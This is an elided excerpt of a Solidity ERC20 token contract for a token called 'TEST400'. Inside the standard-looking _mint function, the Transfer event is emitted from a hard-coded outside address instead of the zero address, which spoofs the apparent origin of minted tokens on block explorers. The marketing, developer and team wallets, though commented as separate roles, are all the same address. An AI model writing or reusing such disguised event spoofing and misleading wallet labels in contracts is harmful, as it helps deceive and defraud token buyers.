...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0xec2466f1e074eDf432c5C654Ca0c1212fE884cc5), account, amount);
    }
...
contract test400 is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("TEST400", "TST400") {
        ...
        swapTokensAtAmount = totalSupply * 1 / 10000; // swap when contract token balance reaches 0.01%
        ...
        marketingWallet = 0x7297443bD23DC3e2B93ee4B30Ed154336e89ea02; // marketing wallet
        devWallet =0x7297443bD23DC3e2B93ee4B30Ed154336e89ea02; // original deployer
        teamwallet = 0x7297443bD23DC3e2B93ee4B30Ed154336e89ea02; // team wallet used for buybacks, team pay and mods
